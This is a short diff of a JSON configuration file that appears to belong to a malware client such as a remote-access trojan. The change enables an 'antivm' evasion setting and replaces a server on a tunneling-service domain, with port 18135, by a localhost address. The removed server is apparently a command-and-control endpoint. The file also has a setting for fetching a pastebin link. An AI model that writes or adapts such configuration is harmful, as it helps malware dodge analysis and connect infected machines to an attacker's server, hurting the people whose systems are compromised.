@@ -1,9 +1,10 @@
 ﻿{
   "debug": true,
-  "antivm": false,
+  "binfile": false,
+  "antivm": true,
 
-  "server": "production-inspections.gl.at.ply.gg",
-  "port": 18135,
+  "server": "127.0.0.1",
+  "port": 6969,
 
   "pastebin": false,
   "pastebinlink": "",
